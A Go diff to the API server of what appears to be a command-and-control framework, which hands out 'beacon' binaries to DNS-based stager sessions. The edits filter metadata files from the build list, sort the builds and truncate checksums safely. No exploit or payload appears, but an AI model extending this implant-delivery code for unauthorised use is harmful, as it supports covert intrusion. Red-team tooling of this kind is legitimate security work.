@@ -17,6 +17,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -2471,15 +2472,26 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 		clientFilename = "beacon-linux"
 	}
 
-	// Find all matching beacon files
-	files, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
+	// Find all matching beacon files (exclude .meta.json files)
+	allFiles, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
 	if err != nil {
 		return "", "", 0, "", fmt.Errorf("failed to search builds directory: %w", err)
+	}
+
+	// Filter out .meta.json files to get only actual binaries
+	var files []string
+	for _, f := range allFiles {
+		if !strings.HasSuffix(f, ".meta.json") {
+			files = append(files, f)
+		}
 	}
 
 	if len(files) == 0 {
 		return "", "", 0, "", fmt.Errorf("no beacon found for %s/%s in %s", osType, arch, buildsDir)
 	}
+
+	// Sort files to ensure consistent ordering (most recent last by timestamp in filename)
+	sort.Strings(files)
 
 	// Use the most recent file (last in sorted list)
 	clientPath := files[len(files)-1]
@@ -2574,7 +2586,12 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	fmt.Printf("[API] Loaded client binary: %s (%d chunks, checksum: %s)\n", clientBinaryID, totalChunks, sha256Checksum[:16])
+	// Safe checksum display (handle short checksums)
+	checksumDisplay := sha256Checksum
+	if len(checksumDisplay) > 16 {
+		checksumDisplay = checksumDisplay[:16]
+	}
+	fmt.Printf("[API] Loaded client binary: %s (%d chunks, checksum: %s)\n", clientBinaryID, totalChunks, checksumDisplay)
 
 	// Create stager session (4-char random ID to keep DNS packets under 512 bytes)
 	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
